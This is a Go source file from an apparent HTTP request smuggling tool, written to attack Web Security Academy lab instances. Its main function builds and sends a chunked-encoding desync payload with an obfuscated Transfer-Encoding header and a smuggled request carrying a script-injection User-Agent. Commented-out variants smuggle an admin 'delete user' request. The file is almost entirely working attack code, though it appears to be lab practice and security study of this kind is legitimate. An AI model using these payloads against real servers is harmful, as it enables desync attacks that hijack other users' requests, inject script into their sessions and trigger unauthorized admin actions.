package smuggler

import (
	"fmt"
	"net/http/httputil"
	"net/url"
)

// h2-cl
func A() {
	id := "0afc007d04c694e8820092b1007e00ce"
	var desyncr DesyncerImpl
	_url, err := url.Parse(fmt.Sprintf("https://%s.web-security-academy.net", id))
	if err != nil {
		panic(err)
	}
	glob := Glob{Uri: fmt.Sprintf("https://%s.web-security-academy.net", id), Method: "POST", Scheme: "https", Url: _url}
	glob.Header = make(map[string]string)
	cookie, err := desyncr.GetCookies(&glob)
	if err != nil {
		panic(err)
	}
	headers := make(map[string]string)
	headers["Connection"] = "Keep-alive"
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	headers["Host"] = fmt.Sprintf("%s.web-security-academy.net", id)
	headers["Transfer-Encoding"] = " chunked"
	headers["User-Agent"] = "\"/><script>alert(1)</script>"
	headers["Cookie"] = cookie
	t := Transport{}

	r := Request{Url: _url}
	pay := Payload{}

	pay.ReqLine = ReqLine{
		Method:  "POST",
		Version: "HTTP/1.1",
	}
	if len(_url.Path) == 0 {
		pay.ReqLine.Path = "/"
	} else {
		pay.ReqLine.Path = _url.Path
	}

	// bb := "csrf=1NFCN888QeQlfYGnrGLbqMez1ElrVMXA&userAgent=\"/><script>alert(1)</script>&postId=6&name=b&email=d@b.c&website=https://www.test.com&comment=a"
	// payload := "GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 40\r\n\r\nX=a"
	payload := "0\r\n\r\nGET /post?postId=6 HTTP/1.1\r\nHost: 0afc007d04c694e8820092b1007e00ce.web-security-academy.net\r\nUser-Agent: \"/><script>alert(1)</script>\r\nContent-Length: 5\r\n\r\nA=1"

	// teclPayload := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(payload), payload) // so everything will be forwarded not only the values between the chunk size
	// teclPayload := fmt.Sprintf("0\r\n\r\n%s", payload)
	// body := "1\r\nG\r\n0\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 20\r\n\r\nX=a"
	pay.Body = payload
	pay.Cl = len(pay.Body)
	// headers["Content-Length"] = "0"

	pay.Header = headers
	r.Payload = &pay
	fmt.Println(r.Payload.ToString())
	rsp, err := t.RoundTrip(&r)
	if err != nil {
		panic(err)
	}

	text, err := httputil.DumpResponse(rsp, false)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(text))

	// body := "POST / HTTP/1.1\r\nHost: 0a5c00d404cb6e7780a3998700e10041.web-security-academy.net\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: 35\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nX: X"
	// bd := bytes.NewBuffer([]byte(body))

	// url, _ := url.Parse("https://0a5c00d404cb6e7780a3998700e10041.web-security-academy.net/")

	// f, err := os.OpenFile("/Users/akewakbiru/Desktop/sslkeys.log", os.O_APPEND|os.O_WRONLY, 0644)
	// if err != nil {
	// 	panic(err)
	// }
	// defer f.Close()

	// cfg := tls.Config{
	// 	NextProtos:   []string{"http/1.1"},
	// 	KeyLogWriter: f,
	// }

	// tc, err := tls.Dial("tcp", url.Hostname()+":443", &cfg)
	// if err != nil {
	// 	panic(err)
	// }

	// if _, err := tc.Write([]byte(body)); err != nil {
	// 	panic(err)
	// }
	// log.Print("request sent")

	// var c chan int = make(chan int)

	// go func() {
	// panic(errors.New("test"))

	// rdr := bufio.NewReader(tc)

	// bbb := make([]byte, 1024)
	// rs, err := tc.Read(bbb)
	// if err != nil {
	// 	c <- 1
	// 	panic(err)
	// }

	// fmt.Println(bbb[:rs])

	// resp, err := http.ReadResponse(rdr, &http.Request{Method: "POST", URL: url, ProtoMinor: 1, ProtoMajor: 1, Body: io.NopCloser(bytes.NewBuffer([]byte(body)))})
	// if err != nil {
	// 	panic(fmt.Errorf("err, %v", err))
	// }

	// bc, _ := httputil.DumpResponse(resp, true)
	// fmt.Println(string(bc))
	// 	c <- 1
	// }()

	// // recover()

	// r, _ := http.NewRequest("GET", "https://0a5c00d404cb6e7780a3998700e10041.web-security-academy.net/", nil)
	// r_, err := http.DefaultClient.Do(r)
	// if err != nil {
	// 	panic(err)
	// }
	// r.Header.Add("User-Agent", "test")
	// if _, err := tc.Write([]byte("GET / HTTP/1.1\r\nHost: 0a5c00d404cb6e7780a3998700e10041.web-security-academy.net\r\n\r\n")); err != nil {
	// 	panic(err)
	// }

	// defer r_.Body.Close()

	// fmt.Println("another sent")
	// fmt.Println("Status", r_.Status)
	// // rdr2 := bufio.NewReader(tc)
	// bys := make([]byte, 1024)
	// rs, err := r_.Body.Read(bys)
	// if err != nil {
	// 	panic(err)
	// }

	// fmt.Println("res", string(bys[:rs]))

	// fmt.Println(<-c)
}

func b(a map[string]string) {
	a["test"] = "changed"
}
